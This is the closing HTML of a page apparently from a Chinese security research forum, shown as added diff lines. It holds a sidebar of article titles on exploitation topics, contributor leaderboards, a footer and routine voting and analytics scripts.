+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname"
+                               href="/t/15834"
+                               title="应用内存中的后渗透利用-远程工具密码读取"
+                            >
+                                应用内存中的后渗透利用-远程工具密码读取
+                            </a>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="https://xzfile.aliyuncs.com//media/upload/avatars/default_avatar.png"/>
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname"
+                               href="/t/15807"
+                               title="基于动态Agent挖掘更多的反序列化入口"
+                            >
+                                基于动态Agent挖掘更多的反序列化入口
+                            </a>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="https://xzfile.aliyuncs.com//media/upload/avatars/default_avatar.png"/>
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname"
+                               href="/t/15841"
+                               title="利用 procfs 实现只读环境下的任意写到RCE"
+                            >
+                                利用 procfs 实现只读环境下的任意写到RCE
+                            </a>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="https://xzfile.aliyuncs.com//media/upload/avatars/default_avatar.png"/>
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname"
+                               href="/t/15799"
+                               title="kernel从小白到大神(二)"
+                            >
+                                kernel从小白到大神(二)
+                            </a>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="https://xzfile.aliyuncs.com//media/upload/avatars/default_avatar.png"/>
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname"
+                               href="/t/15778"
+                               title="由phar反序列化触发的CRMEB前台rce分析"
+                            >
+                                由phar反序列化触发的CRMEB前台rce分析
+                            </a>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="https://xzfile.aliyuncs.com//media/upload/avatars/default_avatar.png"/>
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname"
+                               href="/t/15779"
+                               title="CVE-2024-38816 Spring Framework 目录遍历漏洞详细分析"
+                            >
+                                CVE-2024-38816 Spring Framework 目录遍历漏洞详细分析
+                            </a>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="https://xzfile.aliyuncs.com//media/upload/avatars/default_avatar.png"/>
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname"
+                               href="/t/15826"
+                               title="某OA代码审计"
+                            >
+                                某OA代码审计
+                            </a>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="https://xzfile.aliyuncs.com//media/upload/avatars/default_avatar.png"/>
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname"
+                               href="/t/15805"
+                               title="Thymeleaf模板生成过程以及注入原因分析"
+                            >
+                                Thymeleaf模板生成过程以及注入原因分析
+                            </a>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="https://xzfile.aliyuncs.com//media/upload/avatars/default_avatar.png"/>
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname"
+                               href="/t/15782"
+                               title="新版JS Prototype Pollution to RCE学习解析"
+                            >
+                                新版JS Prototype Pollution to RCE学习解析
+                            </a>
+                        </div>
+
+                    </div>
+                
+            </div>
+    </div>
+
+
+<div class="box">
+    <div class="global-charts">
+        <div id="chart-header">
+            <div class="col-sm-4 text-center charts" data-type="year"
+            >
+                年度贡献榜
+            </div>
+            <div class="text-center charts active" data-type="month"
+            >
+                月度贡献榜
+            </div>
+            <div class="clearfix"></div>
+        </div>
+        <div id="chart_body">
+            <div class="info-body" data-type="year">
+
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="https://xzfile.aliyuncs.com/media/upload/avatars/10995_36191b735a3f1cf36c.png"/>
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="/u/10995" title="Al1ex"
+                               >Al1ex</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">62</span>
+                            </span>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="https://xzfile.aliyuncs.com//media/upload/avatars/default_avatar.png"/>
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="/u/3314" title="熊猫正正"
+                               >熊猫正正</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">45</span>
+                            </span>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="https://xzfile.aliyuncs.com//media/upload/avatars/default_avatar.png"/>
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="/u/76340" title="T0daySeeker"
+                               >T0daySeeker</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">36</span>
+                            </span>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="https://xzfile.aliyuncs.com/media/upload/avatars/43270_40c7bc80a99d40c2ff.png"/>
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="/u/43270" title="朝闻道"
+                               >朝闻道</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">36</span>
+                            </span>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="https://xzfile.aliyuncs.com//media/upload/avatars/default_avatar.png"/>
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="/u/82355" title="ooyywwll"
+                               >ooyywwll</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">28</span>
+                            </span>
+                        </div>
+
+                    </div>
+                
+            </div>
+            <div class="info-body" data-type="month">
+                
+                     <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="https://xzfile.aliyuncs.com//media/upload/avatars/default_avatar.png"/>
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="/u/83993" title="1315609050541697"
+                               style="">1315609050541697</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">4</span>
+                            </span>
+                        </div>
+                    </div>
+                
+                     <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="https://xzfile.aliyuncs.com//media/upload/avatars/default_avatar.png"/>
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="/u/82355" title="ooyywwll"
+                               style="">ooyywwll</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">4</span>
+                            </span>
+                        </div>
+                    </div>
+                
+                     <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="https://xzfile.aliyuncs.com//media/upload/avatars/default_avatar.png"/>
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="/u/79775" title="1222706425506668"
+                               style="">1222706425506668</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">3</span>
+                            </span>
+                        </div>
+                    </div>
+                
+                     <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="https://xzfile.aliyuncs.com//media/upload/avatars/default_avatar.png"/>
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="/u/83759" title="1673799454684900"
+                               style="">1673799454684900</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">3</span>
+                            </span>
+                        </div>
+                    </div>
+                
+                     <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="https://xzfile.aliyuncs.com/media/upload/avatars/10995_36191b735a3f1cf36c.png"/>
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="/u/10995" title="Al1ex"
+                               style="">Al1ex</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">3</span>
+                            </span>
+                        </div>
+                    </div>
+                
+            </div>
+        </div>
+
+    </div>
+</div>
+
+    <div class="box" id="toc-container">
+        <div class="panel-info">
+            <div class="panel-heading">
+                <h4>目录</h4>
+            </div>
+            <div id="toc">
+                <div class="high-light" style="display: block;background-color: #f3f3f3;position: absolute;"></div>
+            </div>
+        </div>
+    </div>
+    <div style="clear: both;"></div>
+
+
+    <script type="text/javascript">
+        $(function () {
+            $(".charts").click(switchChart);
+            $("[data-toggle='tooltip']").tooltip();
+
+            function switchChart() {
+                let _this = $(this);
+                let idx = _this.attr("data-type")
+                let content = $(`#chart_body>.info-body[data-type='${idx}']`)
+                if (!_this.hasClass("active")) {
+                    _this.addClass("active").siblings().removeClass("active")
+                    content.show().siblings().hide()
+                }
+            }
+        })
+    </script>
+
+
+    <style>
+
+    </style>
+
+
+        </div>
+    </div>
+
+
+</div>
+<footer class="bs-docs-footer">
+    <div class="container text-center">
+        <div class="links">
+            <a href="/feed" target="_blank">RSS</a>
+            <a href="/about" target="_blank"><span>关于社区</span></a>
+            <a href="/partner" target="_blank"><span>友情链接</span></a>
+            <a href="/notice">社区小黑板</a>
+            <a href="/connection">联系我们</a>
+            <a href="https://report.aliyun.com/" target="_blank">举报中心</a>
+            <a href="https://www.aliyun.com/complaint" target="_blank">我要投诉</a>
+        </div>
+    </div>
+</footer>
+</body>
+<script src="/static/js/bootstrap.min.js"></script>
+<script src="/static/js/xz.js"></script>
+
+
+    
+    <script type="text/javascript">
+        $(document).ready(function () {
+            voteUp = function (topicPk) {
+                if (topicPk) {
+                    $.ajax({
+                        url: '/forum/topic/up/',
+                        data: {'pk': topicPk},
+                        type: 'post',
+                        dataType: 'json',
+                        success: function (data) {
+                            if (data.not_authenticated) {
+                                window.location.href = 'https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F14157%3Fu_atoken%3D487232ca76b4b948e7049e9a9ae10da8%26u_asig%3D1a0c380817290453544346912e0048&amp;from_type=xianzhi'
+                            } else {
+                                if (data.success) {
+                                    $('.t-vote > .vote-up').html(data.html);
+                                }
+                            }
+                        }
+                    });
+                }
+            };
+            voteDown = function (topicPk) {
+                if (topicPk) {
+                    $.ajax({
+                        url: '/forum/topic/down/',
+                        data: {'pk': topicPk},
+                        type: 'post',
+                        dataType: 'json',
+                        success: function (data) {
+                            if (data.not_authenticated) {
+                                window.location.href = 'https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F14157%3Fu_atoken%3D487232ca76b4b948e7049e9a9ae10da8%26u_asig%3D1a0c380817290453544346912e0048&amp;from_type=xianzhi'
+                            } else {
+                                if (data.success) {
+                                    $('.t-vote > .vote-down').html(data.html);
+                                }
+                            }
+
+                        }
+                    });
+                }
+            };
+            
+            $("[data-toggle='tooltip']").tooltip();
+        });
+    </script>
+
+
+    <script src="https://s11.cnzz.com/z_stat.php?id=1260716569&web_id=1260716569"></script>
+
+</html>
